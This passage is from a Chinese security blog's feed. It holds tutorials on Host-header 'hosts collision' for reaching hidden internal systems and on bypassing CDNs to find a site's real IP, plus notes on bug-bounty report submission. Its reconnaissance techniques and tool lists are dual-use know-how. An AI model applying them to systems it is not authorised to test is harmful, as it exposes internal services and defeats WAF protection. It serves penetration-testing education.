alt="portswigger靶场(burpsuite官方靶场)_78"></p><p><img src="/2023/12/04/portswigger%E9%9D%B6%E5%9C%BA-burpsuite%E5%AE%98%E6%96%B9%E9%9D%B6%E5%9C%BA-%E5%BF%83%E5%BE%97/portswigger%E9%9D%B6%E5%9C%BA(burpsuite%E5%AE%98%E6%96%B9%E9%9D%B6%E5%9C%BA)_79.png" alt="portswigger靶场(burpsuite官方靶场)_79"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hosts碰撞攻击手法</title>
      <link href="/2023/12/02/Hosts%E7%A2%B0%E6%92%9E%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/"/>
      <url>/2023/12/02/Hosts%E7%A2%B0%E6%92%9E%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="Hosts碰撞简介"><a href="#Hosts碰撞简介" class="headerlink" title="Hosts碰撞简介"></a>Hosts碰撞简介</h1><p>首先有四个常识需要注意：</p><ul><li><p>隐形资产 &#x3D;&#x3D;  隐藏资产</p></li><li><p>&#x3D;&#x3D;host注入 ≠ host型的ssrf ≠ hosts碰撞&#x3D;&#x3D;，host碰撞属于host头攻击的一种</p></li><li><p>反向代理服务器 &#x3D;&#x3D; 反代服务器</p></li><li><p>报文头 &#x3D;&#x3D; 标头</p></li></ul><p>再介绍一下Hosts碰撞有什么用：</p><ul><li><p>发现隐形资产</p></li><li><p>暴露内网系统</p></li><li><p>找到业务系统的真实IP</p></li><li><p>绕过云WAF的安全防护</p></li></ul><p>隐形资产是什么？为什么会有隐形资产？</p><p>在渗透测试中，我们会搜集很多IP资产、域名资产，通过端口扫描能够发现其开放的端口。比如都开放了如web端口——对于域名资产的场景是：通过域名能正常访问，对域名做解析发现该域名指向的是一个内网ip。对于IP资产的场景是：通过IP访问状态码报4xx(如400、403、404)禁止我们访问、5xx错误、显示200却对任何输入不做响应。对于同一个资产的场景是：使用其真实IP无法访问，只有域名才能访问。出现这种情况是因为：&#x3D;&#x3D;大部分是因为中间件(如反向代理服务器Nginx)对直接IP访问进行了限制，必须使用域名访问。这些资产大部分是内部员工使用的系统，使用外网IP，但是绑定的域名是内部域名，外网DNS服务器无法解析，必须在本地hosts文件写入绑定关系，才可正常使用内部域名访问&#x3D;&#x3D;。举个例子，一个网站对外主域名为<code>www.test.com</code>，而内网中存在多个业务系统，都绑定了内网域名，比如<code>manage.test.com</code>，这是内网自定义的域名，无法在公网DNS解析到，因为公网无法解析其IP，显然无法直接访问到。系统管理员其实是这样配置的，利用Apache或Nginx进行配置，使得无法直接通过IP去访问系统。因为公网DNS无法解析自定义子域名，因此访问系统有两个条件：知道系统的内网域名和对应的IP，再利用本地DNS解析(在本地hosts文件写入绑定关系)即可访问。这时候就出现了隐形资产概念，&#x3D;&#x3D;隐形资产的出现往往是因为配置错误或是配置未及时回收等原因而造成的&#x3D;&#x3D;，以Nginx为例，Nginx作为反代服务器，后面的业务有时是隐藏的，下面是一副典型的企业部署架构图</p><p><img src="/2023/12/02/Hosts%E7%A2%B0%E6%92%9E%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/image-20231203111457669.png" alt="image-20231203111457669"></p><p>基于这幅架构图，可以很好地看出隐形资产的由来：&#x3D;&#x3D;现在很多较大的公司比较流行资产统一把控，也就是把自己所有的资产全部收缩进内网，然后使用Nginx或是Apache反代服务器，想对外网开放某个资产的时候，就通过这个反代服务器新添加个配置映射出去&#x3D;&#x3D;</p><p>也就存在两种典型的漏洞场景：</p><ul><li>对于nginx背后隐藏的业务，即不开放到外网的业务，如测试环境或预生产环境，将公网的域名解析清除了，但是Nginx配置没有及时清除，&#x3D;&#x3D;绑定正确的host就能正常访问到&#x3D;&#x3D;【业务通过 DNS 解析到外网，后面删除了A记录(但是 nginx&#x2F;Apache 的反向代理还没删除)】</li><li>出于安全性考虑，外网Nginx和内网Nginx是需要做严格区分，但这里却没区分内外网。使用同一个Nginx完成内网和外网服务配置，通过公网域名解析到公网，内网DNS解析到内网。这个时候，&#x3D;&#x3D;绑定正确的host就可以访问到内网系统&#x3D;&#x3D;</li></ul><p>隐形资产在渗透过程中的价值不言而喻，上面的漏洞场景都提到了一种利用手法，即“绑定正确的host就能访问”，这也就有了Hosts碰撞攻击。</p><h1 id="Hosts碰撞原理"><a href="#Hosts碰撞原理" class="headerlink" title="Hosts碰撞原理"></a>Hosts碰撞原理</h1><p>原理在上面已经零零散散地提到了，这里先简单说明下DNS解析机制，当我们访问某个域名时，会解析到对应的IP去访问业务系统，大致顺序如下(1~4)：</p><ol><li>浏览器缓存，先检查自身缓存中有没有被解析过的这个域名对应的ip地址</li><li>本地缓存hosts文件，记录域名和对应的IP地址（&#x3D;&#x3D;此步骤就是hosts碰撞的修改点&#x3D;&#x3D;）</li><li>本区域域名服务器(LDNS)，即你所在或附近城市的域名服务器，大约80%的域名解析到这里就完成了</li><li>再高一级域名服务器，如果还是解析不到就继续往上一级查</li></ol><p>结合DNS解析机制，给出一张hosts碰撞原理图，如下</p><p><img src="/2023/12/02/Hosts%E7%A2%B0%E6%92%9E%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/image-20231203114746007.png" alt="image-20231203114746007"></p><p>再提一下Host报文头，从HTTP &#x2F; 1.1开始，Host报文头是必需的请求报文头。它指定客户端要访问的域名。例如，当用户访问<code>https://example.net/web-security</code>时，其浏览器将组成一个包含Host报文头的请求，如下所示：</p><pre class="line-numbers language-none"><code class="language-none">GET &#x2F;web-security HTTP&#x2F;1.1Host: example.net<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>在Nginx、Apache中，可以通过相应配置文件进行域名绑定，使得直接访问IP是无法访问成功的，而访问其绑定的域名才可以访问成功。</p><p>&#x3D;&#x3D;将请求数据包的host报文头替换为某个域名时，再访问反代服务器的ip，如果Nginx&#x2F;Apache的反向代理的host配置没删除，就会把请求转发到内网对应的host业务服务器上，接着返回该业务的信息，实现本该隐藏的业务访问&#x3D;&#x3D;</p><p>知道了原理，我们就可以收集内网系统的域名和目标资产的IP段，将两者进行组合遍历，便可发现一些暴露在公网的内网资产(即隐形资产)了【通过将域名和IP进行组合遍历，一旦匹配到后端代理服务器上的域名绑定配置，就可以访问到对应的业务系统，从而发现隐形资产。将域名和IP进行组合遍历的过程就是域名和IP进行捆绑碰撞的过程，Hosts碰撞中的“碰撞”一词就体现在这】</p><p>下面举个例子加深印象：</p><pre class="line-numbers language-none"><code class="language-none">场景：外网有个ip: 47.10.10.1，它的域名为: test.com现在它对映射规则配置不当，即存在Hosts碰撞对外映射的域名1: a.test.com对外映射的域名2: b.test.com内部Nginx&#x2F;Apache反代服务器映射的域名: ab.test.com那么这种情况下如果我们进行Hosts碰撞，撞了一个 ab.test.com 进去那么Nginx&#x2F;Apache反代服务器接收到这个 host: ab.test.com 就会直接去请求这个所谓的被收缩进内网的资源（即隐藏资源），然后返回<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="Hosts碰撞攻击手法"><a href="#Hosts碰撞攻击手法" class="headerlink" title="Hosts碰撞攻击手法"></a>Hosts碰撞攻击手法</h1><p>Hosts碰撞流程：</p><ul><li>搜集指向目标内网IP的域名</li><li>搜集目标IP资产</li><li>进行碰撞</li></ul><p>下面对每一个流程进行介绍</p><h2 id="搜集指向目标内网IP的域名"><a href="#搜集指向目标内网IP的域名" class="headerlink" title="搜集指向目标内网IP的域名"></a>搜集指向目标内网IP的域名</h2><p>域名来源主要有：</p><ul><li><p>在对该目标进行信息收集时收集到的域名</p></li><li><p>子域名挖掘</p></li><li><p>自定义常用内部域名字典（内网办公系统常用的域名、子域名等）</p></li></ul><p>这里列举一下内网办公系统常用的子域名：</p><pre class="line-numbers language-none"><code class="language-none">#主域名为www.test.comoa.test.comuser.test.commail.test.comsso.test.comportal.test.com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="搜集目标IP资产"><a href="#搜集目标IP资产" class="headerlink" title="搜集目标IP资产"></a>搜集目标IP资产</h2><p>IP来源主要有：</p><ul><li><p>在对该目标进行信息收集时收集到的ip</p></li><li><p>ping 收集到的域名获取 ip</p></li><li><p>自定义ip段字典</p></li></ul><p>&#x3D;&#x3D;原则上任何一个ip都有host碰撞的价值&#x3D;&#x3D;，但是为了提高效率，要对ip做一些简单的筛选，流程和原则如下：</p><ol><li>筛选未使用cdn的ip地址</li><li>对ip段进行常见web端口扫描(最好是开放web服务的资产)</li><li>访问时状态码为40x、50x的ip</li></ol><p>这里给出一些相应工具：</p><ul><li>检测cdn的工具<ul><li><a href="https://github.com/alwaystest18/cdnChecker">https://github.com/alwaystest18/cdnChecker</a></li></ul></li><li>生成ip段工具<ul><li><a href="https://github.com/projectdiscovery/mapcidr">https://github.com/projectdiscovery/mapcidr</a></li></ul></li><li>web端口扫描工具<ul><li>Nmap</li><li>Masscan</li><li><a href="https://github.com/projectdiscovery/naabu">https://github.com/projectdiscovery/naabu</a></li></ul></li></ul><h2 id="进行碰撞"><a href="#进行碰撞" class="headerlink" title="进行碰撞"></a>进行碰撞</h2><p>实际渗透过程中会使用到的Hosts碰撞工具：</p><ul><li>HostCollision：<a href="https://github.com/pmiaowu/HostCollision">https://github.com/pmiaowu/HostCollision</a></li><li>HostCollisionGUI：<a href="https://github.com/charonlight/HostCollisionGUI">https://github.com/charonlight/HostCollisionGUI</a></li><li>Hosts_scan：<a href="https://github.com/fofapro/Hosts_scan">https://github.com/fofapro/Hosts_scan</a></li><li>hostscan：<a href="https://github.com/cckuailong/hostscan">https://github.com/cckuailong/hostscan</a></li></ul><p>这里再说一点，目前github上面的工具主要针对80、443端口做Hosts碰撞，但是其实还有大量其它的端口存在nginx业务返回码是40x，所以可以给这些工具做一个扩展功能，把对应IP开放的web端口也加入到Hosts碰撞工具中进行碰撞，这样可以收集更多的隐形资产。</p><p>下面再给出一种使用BurpSuite进行Hosts碰撞的方法——本质上就是对某个 IP 的 Host 头的值进行 Fuzz。但注意，该方法仅能对单个IP进行Hosts碰撞，如下：</p><ol><li>收集域名形成FUZZ字典</li><li>将可能存在Hosts碰撞的ip的请求报文发送到BurpSuite的 Intruder 模块</li><li>标记Host报文头的值后导入FUZZ字典即可开始Hosts碰撞</li></ol><p>这里再说一下找到隐形资产后，使用浏览器访问的两种方法，如下：</p><ul><li><p>修改本地hosts文件，添加碰撞出来的IP和域名后，浏览器直接访问即可</p><p>windows：C:\Windows\System32\Drivers\etc\hosts</p><p>linux：&#x2F;etc&#x2F;hosts</p><p><img src="/2023/12/02/Hosts%E7%A2%B0%E6%92%9E%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/image-20231203171356377.png" alt="image-20231203171356377"><img src="/2023/12/02/Hosts%E7%A2%B0%E6%92%9E%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/image-20231203171428354.png" alt="image-20231203171428354"></p></li><li><p>在burp中设置，浏览器挂上burp代理后，进行访问<img src="/2023/12/02/Hosts%E7%A2%B0%E6%92%9E%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/image-20231203171509102.png" alt="image-20231203171509102"></p><p><img src="/2023/12/02/Hosts%E7%A2%B0%E6%92%9E%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/image-20231203171525180.png" alt="image-20231203171525180"></p></li></ul><h1 id="鸣谢"><a href="#鸣谢" class="headerlink" title="鸣谢"></a>鸣谢</h1><ul><li><a href="https://www.tx1ee.cc/2022/01/16/host%E7%A2%B0%E6%92%9E%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90%E5%AE%9E%E6%88%98/">https://www.tx1ee.cc/2022/01/16/host%E7%A2%B0%E6%92%9E%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90%E5%AE%9E%E6%88%98/</a></li><li><a href="https://cn-sec.com/archives/1198135.html">https://cn-sec.com/archives/1198135.html</a></li><li><a href="http://www.hackdig.com/10/hack-513892.htm">http://www.hackdig.com/10/hack-513892.htm</a></li><li><a href="https://m.freebuf.com/articles/web/341893.html">https://m.freebuf.com/articles/web/341893.html</a></li><li><a href="https://www.wangan.com/p/7fy7f8f2d523a3ad#0x01HOSTS%E7%A2%B0%E6%92%9E">https://www.wangan.com/p/7fy7f8f2d523a3ad#0x01HOSTS%E7%A2%B0%E6%92%9E</a></li><li><a href="https://m.freebuf.com/articles/web/290348.html">https://m.freebuf.com/articles/web/290348.html</a></li><li><a href="https://www.cnblogs.com/xiaozi/p/16336539.html">https://www.cnblogs.com/xiaozi/p/16336539.html</a></li><li><a href="https://mp.weixin.qq.com/s/VaqbmE1b2hlHqRYdGeUwmQ">https://mp.weixin.qq.com/s/VaqbmE1b2hlHqRYdGeUwmQ</a></li><li><a href="https://www.yuque.com/pmiaowu/bomi9w/fgg2vg">https://www.yuque.com/pmiaowu/bomi9w/fgg2vg</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    
    
    <entry>
      <title>索引页图像与换行测试</title>
      <link href="/2023/12/01/%E7%B4%A2%E5%BC%95%E9%A1%B5%E5%9B%BE%E5%83%8F%E4%B8%8E%E6%8D%A2%E8%A1%8C%E6%B5%8B%E8%AF%95/"/>
      <url>/2023/12/01/%E7%B4%A2%E5%BC%95%E9%A1%B5%E5%9B%BE%E5%83%8F%E4%B8%8E%E6%8D%A2%E8%A1%8C%E6%B5%8B%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<h1 id="标题1"><a href="#标题1" class="headerlink" title="标题1"></a>标题1</h1><h2 id="标题2"><a href="#标题2" class="headerlink" title="标题2"></a>标题2</h2><h3 id="标题3"><a href="#标题3" class="headerlink" title="标题3"></a>标题3</h3><h4 id="标题4"><a href="#标题4" class="headerlink" title="标题4"></a>标题4</h4><h5 id="标题5"><a href="#标题5" class="headerlink" title="标题5"></a>标题5</h5><h6 id="标题6"><a href="#标题6" class="headerlink" title="标题6"></a>标题6</h6><p>段落</p><h1 id="标题1-1"><a href="#标题1-1" class="headerlink" title="标题1"></a>标题1</h1><p>无序列表</p><ul><li>1<ul><li>1</li><li>2</li><li>3</li></ul></li><li>2</li><li>3</li><li>4</li></ul><h1 id="标题1-2"><a href="#标题1-2" class="headerlink" title="标题1"></a>标题1</h1>]]></content>
      
      
      
        <tags>
            
            <tag> 建站测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>绕过CDN查找网站真实ip</title>
      <link href="/2023/11/30/%E7%BB%95%E8%BF%87CDN%E6%9F%A5%E6%89%BE%E7%BD%91%E7%AB%99%E7%9C%9F%E5%AE%9Eip/"/>
      <url>/2023/11/30/%E7%BB%95%E8%BF%87CDN%E6%9F%A5%E6%89%BE%E7%BD%91%E7%AB%99%E7%9C%9F%E5%AE%9Eip/</url>
      
        <content type="html"><![CDATA[<h1 id="CDN简单介绍"><a href="#CDN简单介绍" class="headerlink" title="CDN简单介绍"></a>CDN简单介绍</h1><p>CDN即内容分发网络，主要解决因传输距离和不同运营商节点造成的网络速度性能低下的问题。说的简单点，就是一组在不同运营商之间的对接点上的高速缓存服务器，&#x3D;&#x3D;把用户经常访问的静态数据资源直接缓存到节点服务器上，当用户再次请求时，会直接分发到离用户近的节点服务器上响应给用户，当用户有实际数据交互时才会从远程Web服务器上响应&#x3D;&#x3D;，这样可以大大提高网站的响应速度及用户体验。</p><p>使用CDN有以下优势：</p><ul><li>提高用户访问速率，优化用户使用体验</li><li>隐藏真实服务器的IP</li><li>提供WAF功能，目前很多CDN也提供了WAF的功能，我们的访问请求会先经过CDN节点的过滤，该过滤可对SQL注入、XSS、Webshell上传、命令注入、恶意扫描等攻击行为进行有效检测和拦截。&#x3D;&#x3D;CDN节点将认为无害的数据提交给真实的主机服务器&#x3D;&#x3D;</li></ul><p>CDN的配置方式如下：</p><ol><li>将域名的 NS 记录指向 CDN 厂商提供的 DNS 服务器</li><li>给域名设置一个 CNAME 记录，将它指向CDN厂商提供的另一个域名</li></ol><p>这里举一个阿里云CDN加速服务的例子：</p><p><img src="/2023/11/30/%E7%BB%95%E8%BF%87CDN%E6%9F%A5%E6%89%BE%E7%BD%91%E7%AB%99%E7%9C%9F%E5%AE%9Eip/image-20231130222449145.png" alt="image-20231130222449145"></p><p>配置CDN后的网络拓扑：</p><p><img src="/2023/11/30/%E7%BB%95%E8%BF%87CDN%E6%9F%A5%E6%89%BE%E7%BD%91%E7%AB%99%E7%9C%9F%E5%AE%9Eip/image-20231130193306251.png" alt="image-20231130193306251"></p><p>几种访问方式的不同：</p><ul><li>传统访问：用户访问域名–&gt;解析服务器ip地址–&gt;访问目标主机</li><li>CDN加速访问：用户访问域名–&gt;CDN节点–&gt;真实服务器ip–&gt;访问目标主机</li><li>带waf的cdn：用户访问域名–&gt;CDN节点(waf)–&gt;真实服务器ip–&gt;访问目标主机</li></ul><h1 id="检测有无CDN"><a href="#检测有无CDN" class="headerlink" title="检测有无CDN"></a>检测有无CDN</h1><p>检测CDN的方法有很多，下面列举几种</p><ul><li><p>使用ping命令：ping一下目标网站，如果响应的域名很长的话，一般就存在cdn<img src="/2023/11/30/%E7%BB%95%E8%BF%87CDN%E6%9F%A5%E6%89%BE%E7%BD%91%E7%AB%99%E7%9C%9F%E5%AE%9Eip/image-20231130194106764.png" alt="image-20231130194106764"></p></li><li><p>使用多地ping(又称超级ping)：使用不同地方的 ping 服务，输入要ping的域名，如果返回的ip地址是多个则极有可能是使用了CDN，如果只有一个ip就是没有使用CDN。这里给出一些多地ping网站：</p><ul><li><a href="https://ping.chinaz.com/">https://ping.chinaz.com/</a></li><li><a href="https://www.17ce.com/">https://www.17ce.com/</a></li></ul></li><li><p>使用 nslookup命令 进行检测，如果返回域名解析对应多个 IP 地址多半是使用了 CDN</p><p><img src="/2023/11/30/%E7%BB%95%E8%BF%87CDN%E6%9F%A5%E6%89%BE%E7%BD%91%E7%AB%99%E7%9C%9F%E5%AE%9Eip/image-20231130221909476.png" alt="image-20231130221909476"></p><p><img src="/2023/11/30/%E7%BB%95%E8%BF%87CDN%E6%9F%A5%E6%89%BE%E7%BD%91%E7%AB%99%E7%9C%9F%E5%AE%9Eip/image-20231130221814569.png" alt="image-20231130221814569"></p></li></ul><h1 id="CDN的绕过"><a href="#CDN的绕过" class="headerlink" title="CDN的绕过"></a>CDN的绕过</h1><p>在渗透测试中，为了要知道网站服务器的真实IP，我们必须绕过CDN查找出网站的真实ip地址</p><h2 id="利用DNS历史解析记录"><a href="#利用DNS历史解析记录" class="headerlink" title="利用DNS历史解析记录"></a>利用DNS历史解析记录</h2><p>查询域名的历史解析记录，可能会找到网站使用CDN前的解析记录，从而获取真实ip（因为有可能目标网站的cdn是今年或者去年开的，所以我们通过查看网站的历史dns解析记录可以得到目标的真实网站地址，因为没有开cdn之前的历史ip大概率是真实ip），相关查询的网站如下：</p><ul><li><a href="https://dnsdb.io/zh-cn/">https://dnsdb.io/zh-cn/</a></li><li><a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a></li><li><a href="http://toolbar.netcraft.com/site_report?url=">http://toolbar.netcraft.com/site_report?url=</a></li><li><a href="http://viewdns.info/">http://viewdns.info/</a></li><li><a href="http://www.17ce.com/">http://www.17ce.com/</a></li><li><a href="https://community.riskiq.com/">https://community.riskiq.com/</a></li><li><a href="http://www.crimeflare.com/cfssl.html">http://www.crimeflare.com/cfssl.html</a></li><li><a href="https://tools.ipip.net/cdn.php">https://tools.ipip.net/cdn.php</a></li><li><a href="https://viewdns.info/iphistory/">https://viewdns.info/iphistory/</a></li><li><a href="https://site.ip138.com/">https://site.ip138.com/</a></li><li><a href="https://securitytrails.com/">https://securitytrails.com/</a></li><li><a href="https://sitereport.netcraft.com/">https://sitereport.netcraft.com/</a></li></ul><p>除了过去的 DNS 记录，即使是当前的记录也可能泄漏原始服务器 IP。例如，&#x3D;&#x3D;MX 记录也可能泄漏原始服务器IP&#x3D;&#x3D;</p><h2 id="查询子域名"><a href="#查询子域名" class="headerlink" title="查询子域名"></a>查询子域名</h2><p>一般适用于主站开启cdn，而子域名没有配置cdn的情况。毕竟 CDN 还是不便宜的，所以很多站长可能只会对主站或者流量大的子站点做了 CDN，而很多小站子站点又跟主站在同一台服务器或者同一个 C 段内，此时就可以通过查询子域名对应的 IP 来辅助查找网站的真实 IP。那么这里就要先挖掘对应主域的子域名了，属于信息搜集的一种，有以下几种手段：</p><ol><li><p>搜索引擎查询</p><pre class="line-numbers language-none"><code class="language-none">#使用Google、baidu、Bing等传统搜索引擎语法搜索子域名，这里以收集www.baidu.com的子域名为例site:baidu.com inurl:baidu.combaidu.com -www<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>在线查询</p><ul><li><a href="http://tool.chinaz.com/subdomain/">http://tool.chinaz.com/subdomain/</a></li><li><a href="http://i.links.cn/subdomain/">http://i.links.cn/subdomain/</a></li><li><a href="http://subdomain.chaxun.la/">http://subdomain.chaxun.la/</a></li><li><a href="http://searchdns.netcraft.com/">http://searchdns.netcraft.com/</a></li><li><a href="https://www.virustotal.com/">https://www.virustotal.com/</a></li><li><a href="https://dnsdb.io/zh-cn/%E3%80%90%E8%BE%93%E5%85%A5baidu.com">https://dnsdb.io/zh-cn/【输入baidu.com</a> type:A就能收集百度的子域名和ip】</li></ul></li><li><p>子域名爆破工具</p></li></ol><ul><li>Layer子域名挖掘机</li><li>wydomain：<a href="https://github.com/ring04h/wydomain">https://github.com/ring04h/wydomain</a></li><li>subDomainsBrute:<a href="https://github.com/lijiejie/">https://github.com/lijiejie/</a></li><li>Sublist3r:<a href="https://github.com/aboul3la/Sublist3r">https://github.com/aboul3la/Sublist3r</a></li></ul><h2 id="Mx记录或邮件配合备案信息-又称利用网站邮件头信息、邮件服务器"><a href="#Mx记录或邮件配合备案信息-又称利用网站邮件头信息、邮件服务器" class="headerlink" title="Mx记录或邮件配合备案信息(又称利用网站邮件头信息、邮件服务器)"></a>Mx记录或邮件配合备案信息(又称利用网站邮件头信息、邮件服务器)</h2><p>一般的邮件系统都在内部，没有经过CDN的解析。很多站点都有发送邮件的功能，如Rss邮件订阅、邮箱注册、邮箱找回密码，&#x3D;&#x3D;只要有邮箱发送功能，我们就可以让服务器给我们的邮箱服务器发邮件，查看邮件，寻找邮件头中的邮件服务器域名IP，ping这个邮件服务器的域名，就可以获得目标的真实IP&#x3D;&#x3D;(必须是目标自己的邮件服务器，第三方或者公共邮件服务器是没有用的)，&#x3D;&#x3D;或者在邮件源码(邮件头信息)里面就会包含服务器的真实 IP&#x3D;&#x3D;<img src="/2023/11/30/%E7%BB%95%E8%BF%87CDN%E6%9F%A5%E6%89%BE%E7%BD%91%E7%AB%99%E7%9C%9F%E5%AE%9Eip/image-20231130233303722.png" alt="image-20231130233303722"><img src="/2023/11/30/%E7%BB%95%E8%BF%87CDN%E6%9F%A5%E6%89%BE%E7%BD%91%E7%AB%99%E7%9C%9F%E5%AE%9Eip/image-20231130233345141.png" alt="image-20231130233345141"></p><h2 id="国外主机解析域名-又称国外多ping"><a href="#国外主机解析域名-又称国外多ping" class="headerlink" title="国外主机解析域名(又称国外多ping)"></a>国外主机解析域名(又称国外多ping)</h2><p>大部分 CDN 厂商因为各种原因(如节约成本)只做了国内的线路，而针对国外的线路可能几乎没有，此时我们使用国外的DNS查询，很可能获取到真实IP。下面使用一些国外多ping的网站：</p><ul><li><a href="https://asm.ca.com/zh_cn/ping.php">https://asm.ca.com/zh_cn/ping.php</a></li><li><a href="https://asm.ca.com/en/ping.php">https://asm.ca.com/en/ping.php</a></li><li><a href="http://host-tracker.com/">http://host-tracker.com/</a></li><li><a href="http://www.webpagetest.org/">http://www.webpagetest.org/</a></li><li><a href="https://dnscheck.pingdom.com/">https://dnscheck.pingdom.com/</a></li><li><a href="https://get-site-ip.com/">https://get-site-ip.com/</a></li><li><a href="https://tools.ipip.net/cdn.php">https://tools.ipip.net/cdn.php</a></li></ul><p>技巧：地区选择非洲或者一些比较落后的地方，因为有一些cdn的配置是可以进行区域划分的，比如说只加速中国、美国、日本这些地区。在非洲这些国家，一般不会布置一些节点，因为这些地区没有什么这方面的业务</p><h2 id="CDN配置错误导致的绕过"><a href="#CDN配置错误导致的绕过" class="headerlink" title="CDN配置错误导致的绕过"></a>CDN配置错误导致的绕过</h2><p>下面列举常见的CDN配置错误：</p><ul><li>仅配置了www域：比如，为了方便用户访问，会将<code>www.test.com</code>和 <code>test.com</code> 解析到同一个站点，但是只在CDN配置了<code>www.test.com</code>，这时候通过访问<code>test.com</code>，就可以绕过 CDN</li><li>仅配置了https协议：站点同时支持http和https访问，但CDN只配置了https协议，那么这时使用http访问即可绕过</li></ul><h1 id="鸣谢"><a href="#鸣谢" class="headerlink" title="鸣谢"></a>鸣谢</h1><ul><li><a href="https://cloud.tencent.com/developer/article/1933535">渗透测试 | 绕过CDN查找网站真实ip-腾讯云开发者社区-腾讯云 (tencent.com)</a></li><li><a href="https://mp.weixin.qq.com/s/CDm3MUZ5yttN71oEOIaPxQ">https://mp.weixin.qq.com/s/CDm3MUZ5yttN71oEOIaPxQ</a></li><li><a href="https://xie.infoq.cn/article/1b1d530f772e33b669f6cbedf">11种绕过CDN查找真实IP方法_网络安全_喀拉峻_InfoQ写作社区</a></li><li><a href="https://cloud.tencent.com/developer/article/1634648">绕过CDN寻找真实IP的8种方法-腾讯云开发者社区-腾讯云 (tencent.com)</a></li><li><a href="https://developer.aliyun.com/article/823990">信息收集——绕过CDN查找真实IP（最实用的方法）-阿里云开发者社区 (aliyun.com)</a></li><li><a href="https://blog.csdn.net/qq_19446965/article/details/118164229">渗透测试-CDN绕过_渗透之cdn绕过-CSDN博客</a></li><li><a href="https://www.cnblogs.com/wybsignal/p/17190379.html">渗透技巧——CDN绕过 - wybsignal - 博客园 (cnblogs.com)</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>src挖掘之拿到漏洞后</title>
      <link href="/2023/11/30/src%E6%8C%96%E6%8E%98%E4%B9%8B%E6%8B%BF%E5%88%B0%E6%BC%8F%E6%B4%9E%E5%90%8E/"/>
      <url>/2023/11/30/src%E6%8C%96%E6%8E%98%E4%B9%8B%E6%8B%BF%E5%88%B0%E6%BC%8F%E6%B4%9E%E5%90%8E/</url>
      
        <content type="html"><![CDATA[<h1 id="关于漏洞提交"><a href="#关于漏洞提交" class="headerlink" title="关于漏洞提交"></a>关于漏洞提交</h1><p>拿到有漏洞的url之后，对于src平台的提交，一般需要填写相应的信息：</p><ul><li>漏洞url</li><li>域名</li><li>域名权重</li><li>域名备案</li><li>公司的基本信息</li></ul><p>信息之间是有关联的，基本流程如下：</p><p>漏洞url–&gt;根据url（因为有些网站是ip站）反查域名–&gt;根据域名反查域名权重–&gt;根据有权重的域名反查域名备案名称–&gt;根据备案名称查询公司的基本信息(例如公司的所在地方和行业等)</p><h2 id="域名权重"><a href="#域名权重" class="headerlink" title="域名权重"></a>域名权重</h2><blockquote><p>这里着重讲一下域名权重</p></blockquote><p>网站权重是指搜索引擎给网站（包括网页）赋予一定的权威值，对网站（含网页）权威的评估评价。一个网站权重越高，在搜索引擎所占的份量越大，在搜索引擎排名就越好。一般公益src平台都会设置这么一个规则，即&#x3D;&#x3D;漏洞网站的主站权重需要达到指定的权重值才会收录&#x3D;&#x3D;</p><p>在线站点可以使用：</p><ul><li><a href="https://seo.chinaz.com/seo.chinaz.com">seo.chinaz.com的seo综合查询 - 站长工具</a></li><li><a href="https://www.qjson.cn/Tools/rank/">域名权重查询工具 - JSON在线格式化校验工具 - www.qjson.cn</a></li><li><a href="https://rank.chinaz.com/all">权重综合查询 - 站长工具 (chinaz.com)</a></li><li><a href="https://rank.aizhan.com/">权重综合查询_网站权重汇总_站长工具 - 爱站网 (aizhan.com)</a></li></ul><p>工具会使用到下面几个：</p><ul><li>ip2domain：<a href="https://github.com/sma11new/ip2domain">https://github.com/sma11new/ip2domain</a></li><li>Domain_SEO【python3.10】：<a href="https://github.com/xiaomao-mao/Domain_SEO">https://github.com/xiaomao-mao/Domain_SEO</a></li></ul><h1 id="鸣谢"><a href="#鸣谢" class="headerlink" title="鸣谢"></a>鸣谢</h1><ul><li><a href="https://mp.weixin.qq.com/s/aIf0RZ_p1Ir_j16BpHj0WA">https://mp.weixin.qq.com/s/aIf0RZ_p1Ir_j16BpHj0WA</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基于网站框架的渗透</title>
      <link href="/2023/11/29/%E5%9F%BA%E4%BA%8E%E7%BD%91%E7%AB%99%E6%A1%86%E6%9E%B6%E7%9A%84%E6%B8%97%E9%80%8F/"/>
      <url>/2023/11/29/%E5%9F%BA%E4%BA%8E%E7%BD%91%E7%AB%99%E6%A1%86%E6%9E%B6%E7%9A%84%E6%B8%97%E9%80%8F/</url>
      
